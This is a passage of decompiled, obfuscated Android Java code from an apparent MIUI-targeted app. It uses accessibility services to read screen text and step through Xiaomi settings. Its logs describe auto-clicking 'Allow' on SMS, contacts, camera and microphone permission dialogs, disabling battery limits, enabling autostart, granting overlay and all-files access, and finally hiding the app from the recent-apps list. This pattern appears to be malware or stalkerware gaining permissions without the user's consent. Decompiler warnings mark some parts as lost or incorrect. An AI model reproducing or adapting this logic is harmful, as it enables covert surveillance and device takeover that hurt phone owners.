        m212274d8("│ │   [调试-电池入口未找到] ════════════════════════════════════════");
        m212274d8("│ │   [调试-电池入口未找到] 📄 当前页面共有 " + arrayList.size() + " 个文本:");
        int i = 0;
        for (Object obj : AbstractC0715je.m213301i8(arrayList, 30)) {
            int i2 = i + 1;
            if (i < 0) {
                AbstractC0716jf.m213309g8();
                throw null;
            }
            m212274d8("│ │   [调试-电池入口未找到]   " + i2 + ". " + ((String) obj));
            i = i2;
        }
        if (arrayList.size() > 30) {
            m212274d8("│ │   [调试-电池入口未找到]   ... 还有 " + (arrayList.size() - 30) + " 个文本");
        }
        m212274d8("│ │   [调试-电池入口未找到] ════════════════════════════════════════");
    }

    /* renamed from: b1 */
    public final void m212252b1() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55106a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return;
        }
        ArrayList arrayList = new ArrayList();
        m212237a5(rootInActiveWindow, arrayList);
        rootInActiveWindow.recycle();
        m212274d8("│ │ │ │   📝 [[步骤3调试]] 页面文本(" + arrayList.size() + "个):");
        Iterator it = AbstractC0715je.m213301i8(arrayList, 20).iterator();
        while (it.hasNext()) {
            AbstractC0003a2.m45c6("│ │ │ │      - ", (String) it.next(), this);
        }
        if (arrayList.size() > 20) {
            m212274d8("│ │ │ │      ... 还有" + (arrayList.size() - 20) + "个");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:107:0x06a1, code lost:
    
        if (r2 == r8) goto L159;
     */
    /* JADX WARN: Code restructure failed: missing block: B:84:0x05a2, code lost:
    
        if (p000.b81.m210571b1(500, r3) != r8) goto L86;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:104:0x0681  */
    /* JADX WARN: Removed duplicated region for block: B:106:0x068c  */
    /* JADX WARN: Removed duplicated region for block: B:120:0x0700  */
    /* JADX WARN: Removed duplicated region for block: B:123:0x0721  */
    /* JADX WARN: Removed duplicated region for block: B:124:0x0723  */
    /* JADX WARN: Removed duplicated region for block: B:127:0x0734  */
    /* JADX WARN: Removed duplicated region for block: B:128:0x0736  */
    /* JADX WARN: Removed duplicated region for block: B:131:0x0749  */
    /* JADX WARN: Removed duplicated region for block: B:132:0x074b  */
    /* JADX WARN: Removed duplicated region for block: B:135:0x075c  */
    /* JADX WARN: Removed duplicated region for block: B:136:0x075e  */
    /* JADX WARN: Removed duplicated region for block: B:139:0x076f  */
    /* JADX WARN: Removed duplicated region for block: B:140:0x0771  */
    /* JADX WARN: Removed duplicated region for block: B:143:0x0795  */
    /* JADX WARN: Removed duplicated region for block: B:144:0x0798  */
    /* JADX WARN: Removed duplicated region for block: B:163:0x07fb  */
    /* JADX WARN: Removed duplicated region for block: B:165:0x07fe  */
    /* JADX WARN: Removed duplicated region for block: B:166:0x0800  */
    /* JADX WARN: Removed duplicated region for block: B:173:0x07aa A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:39:0x0384  */
    /* JADX WARN: Removed duplicated region for block: B:40:0x0390  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x03c3  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x03da  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x041a  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x0423  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x0452  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x0469  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x04ac  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x04b8  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x04e8  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x0501  */
    /* JADX WARN: Removed duplicated region for block: B:75:0x053d  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x054f  */
    /* JADX WARN: Removed duplicated region for block: B:79:0x0560  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:87:0x05ba  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x05d8  */
    /* JADX WARN: Removed duplicated region for block: B:94:0x05e4  */
    /* JADX WARN: Removed duplicated region for block: B:95:0x060f  */
    /* JADX WARN: Type inference failed for: r5v21, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r5v22 */
    /* JADX WARN: Type inference failed for: r5v23 */
    /* JADX WARN: Type inference failed for: r5v24 */
    /* JADX WARN: Type inference failed for: r5v25 */
    /* JADX WARN: Type inference failed for: r5v26 */
    /* JADX WARN: Type inference failed for: r5v27 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:91:0x05d8 -> B:92:0x05dc). Please report as a decompilation issue!!! */
    /* renamed from: b2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212253b2(String str, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$execute$1 miuiSteps$execute$1;
        MiuiSteps$FlowType miuiSteps$FlowType;
        MiuiSteps$FlowType miuiSteps$FlowType2;
        long jCurrentTimeMillis;
        MiuiSteps$FlowType miuiSteps$FlowType3;
        String str2;
        String str3;
        String str4;
        CoroutineSingletons coroutineSingletons;
        long j;
        long j2;
        C0367a4 c0367a4;
        String str5;
        MiuiSteps$FlowType miuiSteps$FlowType4;
        String str6;
        String str7;
        Object obj;
        C0367a4 c0367a42;
        long j3;
        long j4;
        String str8;
        String str9;
        MiuiSteps$FlowType miuiSteps$FlowType5;
        String str10;
        String str11;
        String str12;
        Object objM212255b4;
        long j5;
        long j6;
        boolean zBooleanValue;
        String str13;
        String str14;
        MiuiSteps$FlowType miuiSteps$FlowType6;
        MiuiSteps$FlowType miuiSteps$FlowType7;
        MiuiSteps$FlowType miuiSteps$FlowType8;
        long j7;
        long j8;
        MiuiSteps$execute$1 miuiSteps$execute$12;
        boolean zBooleanValue2;
        long j9;
        MiuiSteps$FlowType miuiSteps$FlowType9;
        MiuiSteps$FlowType miuiSteps$FlowType10;
        String str15;
        long j10;
        long jCurrentTimeMillis2;
        int i;
        int i2;
        String str16;
        String str17;
        boolean zBooleanValue3;
        long j11;
        long j12;
        long j13;
        String str18;
        long j14;
        Object objM212259b8;
        Object obj2;
        MiuiSteps$FlowType miuiSteps$FlowType11;
        long jCurrentTimeMillis3;
        Object objM212260b9;
        MiuiSteps$execute$1 miuiSteps$execute$13;
        C0367a4 c0367a43;
        int i3;
        int i4;
        boolean z;
        boolean z2;
        boolean z3;
        String str19 = str;
        if (continuationImpl instanceof MiuiSteps$execute$1) {
            miuiSteps$execute$1 = (MiuiSteps$execute$1) continuationImpl;
            int i5 = miuiSteps$execute$1.f54323a8;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                miuiSteps$execute$1.f54323a8 = i5 - Integer.MIN_VALUE;
            } else {
                miuiSteps$execute$1 = new MiuiSteps$execute$1(this, continuationImpl);
            }
        }
        Object obj3 = miuiSteps$execute$1.f54321a6;
        CoroutineSingletons coroutineSingletons2 = CoroutineSingletons.f57606a0;
        int i6 = miuiSteps$execute$1.f54323a8;
        MiuiSteps$FlowType miuiSteps$FlowType12 = MiuiSteps$FlowType.POWER_STRATEGY;
        MiuiSteps$FlowType miuiSteps$FlowType13 = MiuiSteps$FlowType.AUTO_START;
        MiuiSteps$FlowType miuiSteps$FlowType14 = MiuiSteps$FlowType.BATTERY_SETTINGS;
        MiuiSteps$FlowType miuiSteps$FlowType15 = MiuiSteps$FlowType.BASIC_PERMISSIONS;
        MiuiSteps$FlowType miuiSteps$FlowType16 = MiuiSteps$FlowType.BACKGROUND_POPUP;
        MiuiSteps$FlowType miuiSteps$FlowType17 = MiuiSteps$FlowType.NOTIFICATION_MANAGER;
        Object obj4 = obj3;
        String str20 = "│ ⏱️ 开始执行...";
        String str21 = "┌──────────────────────────────────────────────────────────────────────────";
        switch (i6) {
            case 0:
                miuiSteps$FlowType = miuiSteps$FlowType13;
                miuiSteps$FlowType2 = miuiSteps$FlowType14;
                kg1.m213544f4(obj4);
                jCurrentTimeMillis = System.currentTimeMillis();
                miuiSteps$FlowType3 = miuiSteps$FlowType12;
                Context context = this.f55107a1;
                if (Settings.System.canWrite(context)) {
                    m212274d8("╔════════════════════════════════════════════════════════════");
                    m212274d8("║ 小米/MIUI 授权流程 - 已完成（检测到系统设置权限）");
                    m212274d8("║ ✅ Settings.System.canWrite = true");
                    m212274d8("║ ⏭️ 跳过整个适配流程");
                    m212274d8("╚════════════════════════════════════════════════════════════");
                    return Boolean.TRUE;
                }
                m212274d8("╔══════════════════════════════════════════════════════════════════════════");
                m212274d8("║ ██╗  ██╗██╗ █████╗  ██████╗ ███╗   ███╗██╗");
                m212274d8("║ ╚██╗██╔╝██║██╔══██╗██╔═══██╗████╗ ████║██║");
                m212274d8("║  ╚███╔╝ ██║███████║██║   ██║██╔████╔██║██║");
                m212274d8("║  ██╔██╗ ██║██╔══██║██║   ██║██║╚██╔╝██║██║");
                m212274d8("║ ██╔╝ ██╗██║██║  ██║╚██████╔╝██║ ╚═╝ ██║██║");
                m212274d8("║ ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝");
                m212274d8("║");
                m212274d8("║ 小米/MIUI 授权流程（18步精简版）");
                m212274d8("╠══════════════════════════════════════════════════════════════════════════");
                str2 = "╔══════════════════════════════════════════════════════════════════════════";
                AbstractC0003a2.m45c6("║ 📱 品牌: ", Build.BRAND, this);
                AbstractC0003a2.m45c6("║ 📱 型号: ", Build.MODEL, this);
                AbstractC0003a2.m45c6("║ 📱 设备: ", Build.DEVICE, this);
                AbstractC0003a2.m45c6("║ 📱 产品: ", Build.PRODUCT, this);
                AbstractC0003a2.m45c6("║ 📱 制造商: ", Build.MANUFACTURER, this);
                str3 = "ms";
                m212274d8("║ 🤖 Android版本: " + Build.VERSION.SDK_INT + " (" + Build.VERSION.RELEASE + ")");
                String packageName = context.getPackageName();
                StringBuilder sb = new StringBuilder("║ 📦 应用包名: ");
                sb.append(packageName);
                m212274d8(sb.toString());
                m212274d8("║ 📦 应用名: " + str19);
                m212274d8("║ ⏰ 开始时间: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
                m212274d8("╠══════════════════════════════════════════════════════════════════════════");
                m212274d8("║ 📋 执行计划:");
                m212274d8("║   1. 基础权限弹窗自动点击");
                m212274d8("║   2. 电池设置（省电与电池/更多电池功能）");
                m212274d8("║   3. 自启动开关");
                m212274d8("║   4. 通知管理");
                m212274d8("║   5. 权限管理（后台弹出/悬浮窗/文件访问）");
                m212274d8("╚══════════════════════════════════════════════════════════════════════════");
                m212274d8("");
                m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                m212274d8("│ 📍 基础权限（短信/通讯录/相机/麦克风等）");
                m212274d8("│ 🎯 目标: 自动点击权限弹窗的「允许」按钮");
                m212274d8("│ ⏱️ 开始执行...");
                m212274d8("└──────────────────────────────────────────────────────────────────────────");
                if (!this.f55109a3.m214204a5(miuiSteps$FlowType15)) {
                    str4 = "╚══════════════════════════════════════════════════════════════════════════";
                    long jCurrentTimeMillis4 = System.currentTimeMillis();
                    miuiSteps$execute$1.f54315a0 = this;
                    miuiSteps$execute$1.f54316a1 = str19;
                    miuiSteps$execute$1.f54317a2 = jCurrentTimeMillis;
                    miuiSteps$execute$1.f54318a3 = jCurrentTimeMillis4;
                    miuiSteps$execute$1.f54323a8 = 1;
                    coroutineSingletons = coroutineSingletons2;
                    if (m212257b6(miuiSteps$execute$1) != coroutineSingletons) {
                        j = jCurrentTimeMillis4;
                        j2 = jCurrentTimeMillis;
                        c0367a4 = this;
                        long jCurrentTimeMillis5 = System.currentTimeMillis() - j;
                        String str22 = str19;
                        StringBuilder sb2 = new StringBuilder("│ ✅ 基础权限完成！耗时: ");
                        sb2.append(jCurrentTimeMillis5);
                        str5 = str3;
                        sb2.append(str5);
                        c0367a4.m212274d8(sb2.toString());
                        c0367a4.f55109a3.m214207a9(miuiSteps$FlowType15);
                        str19 = str22;
                        jCurrentTimeMillis = j2;
                        c0367a4.m212274d8("");
                        c0367a4.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                        c0367a4.m212274d8("│ 📍 步骤1-12: 电池设置");
                        c0367a4.m212274d8("│ 🎯 目标: 打开设置 → 省电与电池 → 关闭省电模式 → 更多电池功能 → 关闭各项开关");
                        c0367a4.m212274d8("│ ⏱️ 开始执行...");
                        c0367a4.m212274d8("└──────────────────────────────────────────────────────────────────────────");
                        miuiSteps$FlowType4 = miuiSteps$FlowType2;
                        if (!c0367a4.f55109a3.m214204a5(miuiSteps$FlowType4)) {
                        }
                    }
                    return coroutineSingletons;
                }
                m212274d8("│ ✅ 基础权限已完成，跳过");
                c0367a4 = this;
                str4 = "╚══════════════════════════════════════════════════════════════════════════";
                str5 = str3;
                coroutineSingletons = coroutineSingletons2;
                c0367a4.m212274d8("");
                c0367a4.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                c0367a4.m212274d8("│ 📍 步骤1-12: 电池设置");
                c0367a4.m212274d8("│ 🎯 目标: 打开设置 → 省电与电池 → 关闭省电模式 → 更多电池功能 → 关闭各项开关");
                c0367a4.m212274d8("│ ⏱️ 开始执行...");
                c0367a4.m212274d8("└──────────────────────────────────────────────────────────────────────────");
                miuiSteps$FlowType4 = miuiSteps$FlowType2;
                if (!c0367a4.f55109a3.m214204a5(miuiSteps$FlowType4)) {
                    str6 = "└──────────────────────────────────────────────────────────────────────────";
                    long jCurrentTimeMillis6 = System.currentTimeMillis();
                    miuiSteps$execute$1.f54315a0 = c0367a4;
                    miuiSteps$execute$1.f54316a1 = str19;
                    miuiSteps$execute$1.f54317a2 = jCurrentTimeMillis;
                    miuiSteps$execute$1.f54318a3 = jCurrentTimeMillis6;
                    str7 = str19;
                    miuiSteps$execute$1.f54323a8 = 2;
                    Object objM212258b7 = c0367a4.m212258b7(miuiSteps$execute$1);
                    if (objM212258b7 != coroutineSingletons) {
                        C0367a4 c0367a44 = c0367a4;
                        obj = objM212258b7;
                        c0367a42 = c0367a44;
                        long j15 = jCurrentTimeMillis;
                        j3 = jCurrentTimeMillis6;
                        j4 = j15;
                        zBooleanValue = ((Boolean) obj).booleanValue();
                        long jCurrentTimeMillis7 = System.currentTimeMillis() - j3;
                        if (zBooleanValue) {
                            str8 = str4;
                            c0367a42.m212274d8("│ ❌ 步骤1-12 失败！耗时: " + jCurrentTimeMillis7 + str5);
                        } else {
                            str8 = str4;
                            c0367a42.m212274d8("│ ✅ 步骤1-12 成功！耗时: " + jCurrentTimeMillis7 + str5);
                            c0367a42.f55109a3.m214207a9(miuiSteps$FlowType4);
                        }
                        jCurrentTimeMillis = j4;
                        str9 = str7;
                        c0367a42.m212274d8("");
                        c0367a42.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                        c0367a42.m212274d8("│ 📍 步骤13: 自启动开关");
                        c0367a42.m212274d8("│ 🎯 目标: 打开应用详情 → 查找自启动 → 开启开关");
                        c0367a42.m212274d8("│ ⏱️ 开始执行...");
                        String str23 = str6;
                        c0367a42.m212274d8(str23);
                        miuiSteps$FlowType5 = miuiSteps$FlowType;
                        if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType5)) {
                        }
                    }
                    return coroutineSingletons;
                }
                c0367a4.m212274d8("│ ✅ 步骤1-12 已完成，跳过");
                str8 = str4;
                str6 = "└──────────────────────────────────────────────────────────────────────────";
                str9 = str19;
                c0367a42 = c0367a4;
                c0367a42.m212274d8("");
                c0367a42.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                c0367a42.m212274d8("│ 📍 步骤13: 自启动开关");
                c0367a42.m212274d8("│ 🎯 目标: 打开应用详情 → 查找自启动 → 开启开关");
                c0367a42.m212274d8("│ ⏱️ 开始执行...");
                String str232 = str6;
                c0367a42.m212274d8(str232);
                miuiSteps$FlowType5 = miuiSteps$FlowType;
                if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType5)) {
                    str10 = str232;
                    str11 = "╠══════════════════════════════════════════════════════════════════════════";
                    long jCurrentTimeMillis8 = System.currentTimeMillis();
                    miuiSteps$execute$1.f54315a0 = c0367a42;
                    miuiSteps$execute$1.f54316a1 = str9;
                    miuiSteps$execute$1.f54317a2 = jCurrentTimeMillis;
                    miuiSteps$execute$1.f54318a3 = jCurrentTimeMillis8;
                    str12 = str9;
                    miuiSteps$execute$1.f54323a8 = 3;
                    objM212255b4 = c0367a42.m212255b4(miuiSteps$execute$1);
                    if (objM212255b4 != coroutineSingletons) {
                        long j16 = jCurrentTimeMillis;
                        j5 = jCurrentTimeMillis8;
                        j6 = j16;
                        zBooleanValue2 = ((Boolean) objM212255b4).booleanValue();
                        long jCurrentTimeMillis9 = System.currentTimeMillis() - j5;
                        if (zBooleanValue2) {
                            j9 = j6;
                            c0367a42.m212274d8("│ ❌ 步骤13 失败！耗时: " + jCurrentTimeMillis9 + str5);
                        } else {
                            j9 = j6;
                            c0367a42.m212274d8("│ ✅ 步骤13 成功！耗时: " + jCurrentTimeMillis9 + str5);
                            c0367a42.f55109a3.m214207a9(miuiSteps$FlowType5);
                        }
                        str9 = str12;
                        jCurrentTimeMillis = j9;
                        c0367a42.m212274d8("");
                        c0367a42.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                        c0367a42.m212274d8("│ 📍 步骤13.5: 省电策略");
                        c0367a42.m212274d8("│ 🎯 目标: 打开MIUI省电策略页面 → 点击无限制");
                        c0367a42.m212274d8("│ ⏱️ 开始执行...");
                        str13 = str10;
                        c0367a42.m212274d8(str13);
                        str14 = str11;
                        miuiSteps$FlowType6 = miuiSteps$FlowType3;
                        if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType6)) {
                        }
                    }
                    return coroutineSingletons;
                }
                c0367a42.m212274d8("│ ✅ 步骤13 已完成，跳过");
                str10 = str232;
                str11 = "╠══════════════════════════════════════════════════════════════════════════";
                c0367a42.m212274d8("");
                c0367a42.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                c0367a42.m212274d8("│ 📍 步骤13.5: 省电策略");
                c0367a42.m212274d8("│ 🎯 目标: 打开MIUI省电策略页面 → 点击无限制");
                c0367a42.m212274d8("│ ⏱️ 开始执行...");
                str13 = str10;
                c0367a42.m212274d8(str13);
                str14 = str11;
                miuiSteps$FlowType6 = miuiSteps$FlowType3;
                if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType6)) {
                    miuiSteps$FlowType7 = miuiSteps$FlowType5;
                    miuiSteps$FlowType8 = miuiSteps$FlowType4;
                    long jCurrentTimeMillis10 = System.currentTimeMillis();
                    miuiSteps$execute$1.f54315a0 = c0367a42;
                    miuiSteps$execute$1.f54316a1 = str9;
                    miuiSteps$execute$1.f54317a2 = jCurrentTimeMillis;
                    miuiSteps$execute$1.f54318a3 = jCurrentTimeMillis10;
                    miuiSteps$execute$1.f54323a8 = 4;
                    Object objM212261c0 = c0367a42.m212261c0(miuiSteps$execute$1);
                    if (objM212261c0 != coroutineSingletons) {
                        long j17 = jCurrentTimeMillis;
                        j7 = jCurrentTimeMillis10;
                        j8 = j17;
                        obj4 = objM212261c0;
                        zBooleanValue3 = ((Boolean) obj4).booleanValue();
                        long jCurrentTimeMillis11 = System.currentTimeMillis() - j7;
                        if (zBooleanValue3) {
                            c0367a42.m212274d8("│ ⚠️ 步骤13.5 失败！耗时: " + jCurrentTimeMillis11 + "ms（继续后续流程）");
                            miuiSteps$execute$12 = miuiSteps$execute$1;
                        } else {
                            miuiSteps$execute$12 = miuiSteps$execute$1;
                            c0367a42.m212274d8("│ ✅ 步骤13.5 成功！耗时: " + jCurrentTimeMillis11 + str5);
                            c0367a42.f55109a3.m214207a9(miuiSteps$FlowType6);
                        }
                        jCurrentTimeMillis = j8;
                        c0367a42.m212274d8("");
                        c0367a42.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                        c0367a42.m212274d8("│ 📍 步骤14-15: 通知管理");
                        c0367a42.m212274d8("│ 🎯 目标: 打开通知管理 → 开启允许通知 → 滚动查找通知类别OFF → 关闭");
                        c0367a42.m212274d8("│ ⏱️ 开始执行...");
                        c0367a42.m212274d8(str13);
                        miuiSteps$FlowType9 = miuiSteps$FlowType17;
                        if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType9)) {
                        }
                    }
                    return coroutineSingletons;
                }
                c0367a42.m212274d8("│ ✅ 步骤13.5 已完成，跳过");
                miuiSteps$execute$12 = miuiSteps$execute$1;
                miuiSteps$FlowType7 = miuiSteps$FlowType5;
                miuiSteps$FlowType8 = miuiSteps$FlowType4;
                c0367a42.m212274d8("");
                c0367a42.m212274d8("┌──────────────────────────────────────────────────────────────────────────");
                c0367a42.m212274d8("│ 📍 步骤14-15: 通知管理");
                c0367a42.m212274d8("│ 🎯 目标: 打开通知管理 → 开启允许通知 → 滚动查找通知类别OFF → 关闭");
                c0367a42.m212274d8("│ ⏱️ 开始执行...");
                c0367a42.m212274d8(str13);
                miuiSteps$FlowType9 = miuiSteps$FlowType17;
                if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType9)) {
                    miuiSteps$FlowType10 = miuiSteps$FlowType15;
                    miuiSteps$execute$1 = miuiSteps$execute$12;
                    str15 = str13;
                    j10 = jCurrentTimeMillis;
                    jCurrentTimeMillis2 = System.currentTimeMillis();
                    i = 1;
                    i2 = 2;
                    if (i <= 1) {
                        str16 = str20;
                        str17 = str21;
                        c0367a42.m212274d8(AbstractC0003a2.m31b2("│ 🔄 通知流程第", i, "/", i2, "次重试..."));
                        miuiSteps$execute$1.f54315a0 = c0367a42;
                        miuiSteps$execute$1.f54316a1 = str9;
                        miuiSteps$execute$1.f54317a2 = j10;
                        miuiSteps$execute$1.f54319a4 = i2;
                        miuiSteps$execute$1.f54318a3 = jCurrentTimeMillis2;
                        miuiSteps$execute$1.f54320a5 = i;
                        miuiSteps$execute$1.f54323a8 = 5;
                        if (c0367a42.m212280e5(miuiSteps$execute$1) != coroutineSingletons) {
                            j12 = jCurrentTimeMillis2;
                            j11 = j10;
                            miuiSteps$execute$1.f54315a0 = c0367a42;
                            miuiSteps$execute$1.f54316a1 = str9;
                            miuiSteps$execute$1.f54317a2 = j11;
                            miuiSteps$execute$1.f54319a4 = i2;
                            miuiSteps$execute$1.f54318a3 = j12;
                            miuiSteps$execute$1.f54320a5 = i;
                            miuiSteps$execute$1.f54323a8 = 6;
                            str18 = str9;
                            j13 = j12;
                            break;
                        }
                        return coroutineSingletons;
                    }
                    str16 = str20;
                    str17 = str21;
                    str18 = str9;
                    j14 = jCurrentTimeMillis2;
                    j11 = j10;
                    miuiSteps$execute$1.f54315a0 = c0367a42;
                    miuiSteps$execute$1.f54316a1 = str18;
                    miuiSteps$execute$1.f54317a2 = j11;
                    miuiSteps$execute$1.f54319a4 = i2;
                    miuiSteps$execute$1.f54318a3 = j14;
                    miuiSteps$execute$1.f54320a5 = i;
                    miuiSteps$execute$1.f54323a8 = 7;
                    objM212259b8 = c0367a42.m212259b8(miuiSteps$execute$1);
                    if (objM212259b8 != coroutineSingletons) {
                        j10 = j11;
                        jCurrentTimeMillis2 = j14;
                        str9 = str18;
                        obj2 = objM212259b8;
                        if (((Boolean) obj2).booleanValue()) {
                            c0367a42.m212274d8("│ ⚠️ 步骤14-15 第" + i + "次尝试失败");
                            if (i >= i2) {
                                miuiSteps$execute$13 = miuiSteps$execute$1;
                                c0367a42.m212274d8("│ ❌ 步骤14-15 " + i2 + "次尝试后仍失败！耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis2) + str5);
                            } else {
                                miuiSteps$execute$13 = miuiSteps$execute$1;
                            }
                            if (i != i2) {
                                i++;
                                str20 = str16;
                                str21 = str17;
                                miuiSteps$execute$1 = miuiSteps$execute$13;
                                if (i <= 1) {
                                }
                            }
                        } else {
                            c0367a42.m212274d8("│ ✅ 步骤14-15 成功！耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis2) + "ms (第" + i + "次尝试)");
                            c0367a42.f55109a3.m214207a9(miuiSteps$FlowType9);
                            miuiSteps$execute$13 = miuiSteps$execute$1;
                        }
                        miuiSteps$execute$1 = miuiSteps$execute$13;
                        c0367a42.m212274d8("");
                        c0367a42.m212274d8(str17);
                        c0367a42.m212274d8("│ 📍 步骤16: 权限管理/文件权限");
                        c0367a42.m212274d8("│ 🎯 目标: 权限管理（通知类短信/后台弹出/悬浮窗）+ 所有文件管理权限");
                        c0367a42.m212274d8(str16);
                        c0367a42.m212274d8(str15);
                        miuiSteps$FlowType11 = miuiSteps$FlowType16;
                        if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType11)) {
                        }
                    }
                    return coroutineSingletons;
                }
                c0367a42.m212274d8("│ ✅ 步骤14-15 已完成，跳过");
                str16 = "│ ⏱️ 开始执行...";
                str17 = "┌──────────────────────────────────────────────────────────────────────────";
                miuiSteps$FlowType10 = miuiSteps$FlowType15;
                miuiSteps$execute$1 = miuiSteps$execute$12;
                str15 = str13;
                j10 = jCurrentTimeMillis;
                c0367a42.m212274d8("");
                c0367a42.m212274d8(str17);
                c0367a42.m212274d8("│ 📍 步骤16: 权限管理/文件权限");
                c0367a42.m212274d8("│ 🎯 目标: 权限管理（通知类短信/后台弹出/悬浮窗）+ 所有文件管理权限");
                c0367a42.m212274d8(str16);
                c0367a42.m212274d8(str15);
                miuiSteps$FlowType11 = miuiSteps$FlowType16;
                if (!c0367a42.f55109a3.m214204a5(miuiSteps$FlowType11)) {
                    jCurrentTimeMillis3 = System.currentTimeMillis();
                    miuiSteps$execute$1.f54315a0 = c0367a42;
                    miuiSteps$execute$1.f54316a1 = null;
                    miuiSteps$execute$1.f54317a2 = j10;
                    miuiSteps$execute$1.f54318a3 = jCurrentTimeMillis3;
                    miuiSteps$execute$1.f54323a8 = 8;
                    objM212260b9 = c0367a42.m212260b9(str9, miuiSteps$execute$1);
                    break;
                } else {
                    c0367a42.m212274d8("│ ✅ 步骤16 已完成，跳过");
                    MiuiSteps$execute$1 miuiSteps$execute$14 = miuiSteps$execute$1;
                    c0367a43 = c0367a42;
                    long jCurrentTimeMillis12 = System.currentTimeMillis() - j10;
                    og1 og1Var = c0367a43.f55109a3;
                    Context context2 = c0367a43.f55107a1;
                    MiuiSteps$FlowType miuiSteps$FlowType18 = miuiSteps$FlowType8;
                    i3 = (!og1Var.m214204a5(miuiSteps$FlowType18) && og1Var.m214204a5(miuiSteps$FlowType9) && og1Var.m214204a5(miuiSteps$FlowType11)) ? 1 : 0;
                    c0367a43.m212274d8("");
                    c0367a43.m212274d8(str2);
                    c0367a43.m212274d8("║ 📊 执行结果汇总");
                    String str24 = str14;
                    c0367a43.m212274d8(str24);
                    c0367a43.m212274d8("║ 基础权限:        ".concat(!og1Var.m214204a5(miuiSteps$FlowType10) ? "✅" : "❌"));
                    c0367a43.m212274d8("║ 电池设置:        ".concat(!og1Var.m214204a5(miuiSteps$FlowType18) ? "✅" : "❌"));
                    c0367a43.m212274d8("║ 自启动:          ".concat(!og1Var.m214204a5(miuiSteps$FlowType7) ? "✅" : "⚠️"));
                    c0367a43.m212274d8("║ 通知管理:        ".concat(!og1Var.m214204a5(miuiSteps$FlowType9) ? "✅" : "❌"));
                    c0367a43.m212274d8("║ 权限/文件:       ".concat(!og1Var.m214204a5(miuiSteps$FlowType11) ? "✅" : "❌"));
                    c0367a43.m212274d8(str24);
                    ?? r5 = "║ ⏱️ 总耗时: ";
                    c0367a43.m212274d8("║ ⏱️ 总耗时: " + jCurrentTimeMillis12 + str5);
                    c0367a43.m212274d8("║ 🏁 结果: ".concat(i3 == 0 ? "✅ 完成" : "⚠️ 未完成"));
                    c0367a43.m212274d8(str8);
                    if (i3 != 0) {
                        z = true;
                        return Boolean.valueOf(i3 == 0 ? z : false);
                    }
                    try {
                        c0367a43.m212274d8("[隐藏] 🎭 启动Activity触发setExcludeFromRecents...");
                        Intent intentM211757a1 = new C0328b3(context2).m211757a1();
                        try {
                            if (intentM211757a1 != null) {
                                intentM211757a1.addFlags(8388608);
                                r5 = 1;
                                intentM211757a1.putExtra("TRIGGER_EXCLUDE_FROM_RECENTS", true);
                                context2.startActivity(intentM211757a1);
                                c0367a43.m212274d8("[隐藏] 🎭 Activity已启动");
                            } else {
                                r5 = 1;
                                c0367a43.m212274d8("[隐藏] ⚠️ 无可用的启动 Activity");
                            }
                            miuiSteps$execute$14.f54315a0 = c0367a43;
                            miuiSteps$execute$14.f54316a1 = null;
                            miuiSteps$execute$14.f54319a4 = i3;
                            miuiSteps$execute$14.f54323a8 = 9;
                        } catch (Exception e) {
                            e = e;
                            i4 = i3;
                            z2 = r5;
                            AbstractC0003a2.m45c6("[隐藏] ⚠️ 启动失败: ", e.getMessage(), c0367a43);
                            z3 = z2;
                            i3 = i4;
                            z = z3;
                            return Boolean.valueOf(i3 == 0 ? z : false);
                        }
                    } catch (Exception e2) {
                        e = e2;
                        r5 = 1;
                    }
                    if (b81.m210571b1(150L, miuiSteps$execute$14) != coroutineSingletons) {
                        i4 = i3;
                        z3 = r5;
                        i3 = i4;
                        z = z3;
                        return Boolean.valueOf(i3 == 0 ? z : false);
                    }
                    return coroutineSingletons;
                }
            case 1:
                miuiSteps$FlowType = miuiSteps$FlowType13;
                miuiSteps$FlowType2 = miuiSteps$FlowType14;
                long j18 = miuiSteps$execute$1.f54318a3;
                long j19 = miuiSteps$execute$1.f54317a2;
                String str25 = miuiSteps$execute$1.f54316a1;
                C0367a4 c0367a45 = miuiSteps$execute$1.f54315a0;
                kg1.m213544f4(obj4);
                c0367a4 = c0367a45;
                str19 = str25;
                str3 = "ms";
                miuiSteps$FlowType3 = miuiSteps$FlowType12;
